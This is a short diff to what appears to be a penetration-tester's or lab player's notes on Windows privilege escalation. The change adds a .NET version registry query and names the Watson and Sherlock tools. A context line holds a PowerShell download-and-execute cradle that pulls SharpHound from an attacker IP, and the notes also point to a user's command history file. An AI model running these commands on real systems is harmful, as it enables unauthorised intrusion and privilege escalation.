@@ -73,6 +73,11 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1')
 tasklist /svc
 
 Check history: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+Check the .NET version: reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+tools:
+  Watson
+  Sherlock
 ```
 #### PE with Cert
 We can use some tool for recommend to find vulnerability => Certify.exe
